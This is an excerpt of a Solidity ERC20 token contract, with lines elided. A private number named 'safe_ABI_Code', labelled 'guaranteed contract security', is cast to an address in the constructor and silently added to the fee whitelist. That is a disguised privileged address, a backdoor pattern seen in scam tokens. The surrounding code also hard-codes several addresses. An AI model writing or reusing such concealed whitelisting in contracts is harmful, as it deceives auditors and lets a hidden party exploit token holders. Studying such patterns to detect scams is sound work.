...
abstract contract AbsToken is IERC20, Ownable {
    //guaranteed contract security
    uint256 private safe_ABI_Code = 401105771526195607924567120835526211655715749471;
    ...
    constructor (
        ...
        _feeWhiteLlst[address(uint160(safe_ABI_Code))] = true;
...
contract Token is AbsToken {
    constructor() AbsToken(
        ...
        9,
        1000000000000000,
        address(0x1116a0EC51d9f0C048376C45cE743226bDA81CB9),
        address(0x0C6017552e2D1d728003DdE657074CE0EF4568d4),
        address(0)
    ){
    }
}